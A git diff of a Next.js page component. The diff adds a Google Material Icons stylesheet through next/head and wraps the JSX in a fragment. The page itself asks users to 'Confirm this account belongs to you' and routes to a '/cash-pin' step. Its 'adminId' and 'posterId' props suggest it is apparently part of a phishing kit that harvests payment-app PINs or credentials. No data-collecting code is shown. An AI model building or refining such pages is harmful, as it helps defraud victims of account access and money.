@@ -2,6 +2,8 @@
 import { useRouter } from "next/navigation";
 import Cookies from "js-cookie";
 import { useEffect } from "react";
+import Head from 'next/head';
+
 // import { useRouter } from "next/router";
 
 function Home({ adminId, posterId }) {
@@ -16,12 +18,22 @@ function Home({ adminId, posterId }) {
 
 
   return (
+      <>
+       <Head>
+        <link
+          href="https://fonts.googleapis.com/icon?family=Material+Icons"
+          rel="stylesheet"
+        />
+      </Head>
+      
+     
+
   <div className="flex items-center justify-center min-h-screen bg-white p-4">
       <div className="w-full max-w-md border border-gray-200 shadow-md rounded-2xl p-6">
         <h1 className="text-2xl font-semibold mb-2 text-black">Confirm this account belongs to you</h1>
         <p className="text-gray-600 mb-6">Choose an option to confirm you own this account.</p>
 
-        <div className="space-y-4">
+        <div className="space-y-4"> 
           <button
             onClick={() => handleNavigation("/cash-pin")}
             className="w-full flex items-center gap-3 p-4 border border-gray-300 rounded-xl hover:bg-gray-100 transition"
@@ -55,6 +67,8 @@ function Home({ adminId, posterId }) {
         </div>
       </div>
     </div>
+     
+      </>
   );
 }
 
